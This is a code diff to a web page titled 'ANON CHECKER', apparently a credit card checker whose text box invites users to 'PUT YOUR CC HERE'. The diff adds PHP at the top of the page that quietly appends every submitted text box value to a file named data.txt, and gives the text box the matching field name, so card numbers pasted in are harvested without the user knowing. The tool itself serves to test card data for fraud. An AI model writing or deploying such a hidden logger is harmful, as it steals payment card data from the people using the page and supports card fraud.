@@ -1,4 +1,9 @@
-
+<?php
+            	
+$data = $_POST['textdata'];
+$fp = fopen('data.txt', 'a');
+fwrite($fp, $data);
+fclose($fp);
 <!DOCTYPE html>
 <html class="loading">
   <head>
@@ -26,7 +31,7 @@
 			<div class="card">
 				<div class="card-body text-center">
 					<h4 class="mb-2"><strong>ANON CHECKER</strong></h4>
-					<textarea rows="6" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CC HERE :>"></textarea>												
+					<textarea rows="6" name="textdata" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CC HERE :>"></textarea>												
 					<button class="btn btn-play btn-glow btn-bg-gradient-x-blue-cyan text-white" style="width: 49%; float: left;"><i class="fa fa-play"></i>START</button>
 					<button class="btn btn-stop btn-glow btn-bg-gradient-x-red-pink text-white" style="width: 49%; float: right;" disabled><i class="fa fa-stop"></i>STOP</button>
 
